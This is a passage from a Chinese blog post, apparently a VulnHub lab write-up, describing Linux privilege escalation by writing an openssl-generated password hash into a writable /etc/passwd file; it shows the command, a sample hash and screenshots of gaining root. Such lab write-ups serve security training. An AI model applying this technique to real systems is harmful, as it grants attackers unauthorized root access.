<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679826164163-1a5e6a63-75e5-4f20-b6dc-fafb1e09fee7.png#averageHue=%23272a34&clientId=ueb5e9fa1-c984-4&from=paste&height=780&id=u3c5d2f7b&name=image.png&originHeight=780&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=313054&status=done&style=none&taskId=ucad006a4-4d6b-4dcb-bd8f-276ba27792c&title=&width=869" alt="image.png"><br>除了自己用户，然后就是 dev 下 的文件 <br>居然存在一个&#x2F;etc&#x2F;passwd 文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679826230965-25d1f2a7-2836-4212-80b0-42939531ec3b.png#averageHue=%232a2f3c&clientId=ueb5e9fa1-c984-4&from=paste&height=426&id=u1f1fcf9d&name=image.png&originHeight=426&originWidth=721&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206589&status=done&style=none&taskId=uc4893270-e01d-4b70-924b-0ee601a7110&title=&width=721" alt="image.png"><br>对passwd 文件每行的一个解释 </p>
<blockquote>
<p> 注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序 </p>
</blockquote>
<p>第二个都是x   x 又是口令(密码)<br>我们可以添加一个密码 ，然后&#x2F;etc&#x2F;shadow 这个文件里面 修改的某某用户的密码就不管用了<br><a name="L3vV3"></a></p>
<h2><span id="生成passwd">生成passwd</span></h2><p>可以使用openssl 生成 密码</p>
<blockquote>
<p>openssl  passwd -1</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679826475939-ac7bf2f6-dc1c-45be-ad86-497cccf99e60.png#averageHue=%232d323e&clientId=ueb5e9fa1-c984-4&from=paste&height=68&id=u425597d6&name=image.png&originHeight=68&originWidth=470&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15393&status=done&style=none&taskId=u8f99f5f7-2803-4e7c-ad88-1db20b8b2a7&title=&width=470" alt="image.png"><br>把生成的密码添加到&#x2F;etc&#x2F;passwd 里面去</p>
<blockquote>
<p>$1$.Az4zpRm$OuKDJE1cRDaOxDEfvlkGX1</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679826555549-ed54e1b7-1d2f-4ebb-9869-f10c4e6bdd53.png#averageHue=%232a2f3a&clientId=ueb5e9fa1-c984-4&from=paste&height=475&id=u6efe836c&name=image.png&originHeight=475&originWidth=810&originalType=binary&ratio=1&rotation=0&showTitle=false&size=282499&status=done&style=none&taskId=u17040f92-2b7d-46da-8f96-e83df89e0f9&title=&width=810" alt="image.png"></p>
<p><a name="gYcgB"></a></p>
<h2><span id="成功提权">成功提权</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1679826593511-3a8bdd1a-4fef-4302-bed8-1080091141d7.png#averageHue=%23232835&clientId=ueb5e9fa1-c984-4&from=paste&height=96&id=u978553b2&name=image.png&originHeight=96&originWidth=559&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19084&status=done&style=none&taskId=uffbd7bc1-0cfd-4971-bb4d-229d29621c0&title=&width=559" alt="image.png"></p>

      </div>
    </div>
  </article>
  <div class="post__foot">
    
    <div class="post-nav">
  
    <a class="post-nav-item-left" href="/2023/04/05/%E6%9F%90%E6%9F%90%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E(%E5%B7%B2%E4%BF%AE%E5%A4%8D)/">
      <div class="text-align">
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
        <span class="text-small">上一篇</span>
      </div>
      <div>某某系统存在通用漏洞</div>
    </a>
  
  <div class="vhr"></div>
  
    <a class="post-nav-item-right" href="/2023/03/24/Challenge-21-25/">
      <div class="text-align">
        <span class="text-small">下一篇</span>
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             transform="scale(-1,-1)"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
      </div>
      Challenge-21-25
    </a>
  
</div>

    
      <div class="related-post">
  <div class="related__head">
  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>

</div>
  <div class="realated__body">
    
      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
    
  </div>
</div>

    
    
  </div>

    </div>
    <div class="foot">
      <div class="foot-inner">
        <div class="foot__head">
          
            <div class="foot-line">
              
                <div class="matts">浮</div>
              
                <div class="matts">云</div>
              
                <div class="matts">游</div>
              
                <div class="matts">子</div>
              
                <div class="matts">意</div>
              
            </div>
          
            <div class="foot-line">
              
                <div class="matts">落</div>
              
                <div class="matts">日</div>
              
                <div class="matts">故</div>
              
                <div class="matts">人</div>
              
                <div class="matts">情</div>
              
            </div>
          
        </div>
        <div class="foot__body">
          
          
            <div class="foot-item">
              <div class="foot-item__head">账号</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
                  </div>
                
              </div>
            </div>
          
          <div class="foot-item">
            <div class="foot-item__head">联系</div>
            <div class="foot-item__body">
              <div class="text">
                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
              </div>
            </div>
          </div>
        </div>
        <div class="copyright">
          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
          <svg width="20" height="20" viewBox="0 0 725 725">
            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
          </svg>
          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
        </div>
      </div>
    </div>
    
    
  

  </body>
</html>